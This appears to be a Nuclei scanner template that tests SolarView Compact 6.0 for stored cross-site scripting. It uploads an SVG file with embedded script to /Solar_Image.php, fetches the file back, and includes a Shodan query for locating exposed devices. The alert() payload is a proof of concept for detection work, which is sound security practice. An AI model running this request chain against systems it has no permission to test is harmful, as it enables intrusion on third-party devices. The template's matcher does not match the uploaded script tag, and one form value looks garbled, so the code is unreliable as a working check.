id: solarview-xss

info:
  name: SolarView Compact 6.00 - Cross Site Scripting via File Upload 
  author: arafatansari
  severity: critical
  description: |
    SolarView Compact 6.0 allows attackers to execute cross site scripting in /images/background/filename.ext via  file upload.
  metadata:
    shodan-query: http.html:"SolarView Compact"
    verified: "true"
  tags: xss,stored,solarview

requests:
  - raw:
      - |
        POST /Solar_Image.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryr2ze6AOgp49LfT89

        ------WebKitFormBoundaryr2ze6AOgp49LfT89
        Content-Disposition: form-data; name="userfile"; filename="nuclei.svg"
        Content-Type: image/svg+xml

        <?xml version="1.0" standalone="no"?>

        <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

        <svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
          <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
          <script type="text/javascript">
              alert("document.domain");
          </script>
        </svg>
        ------WebKitFormBoundaryr2ze6AOgp49LfT89
        Content-Disposition: form-data; name="upfilename"

        {{randstr}}.svg
        ------WebKitFormBoundaryr2ze6AOgp49LfT89
        Content-Disposition: form-data; name="button"

        t@Cð]
        ------WebKitFormBoundaryr2ze6AOgp49LfT89--

      - |
        GET /images/background/{{randstr}}.svg HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '<script>alert("document.domain")</script>'

      - type: word
        part: header
        words:
          - text/html

      - type: status
        status:
          - 200
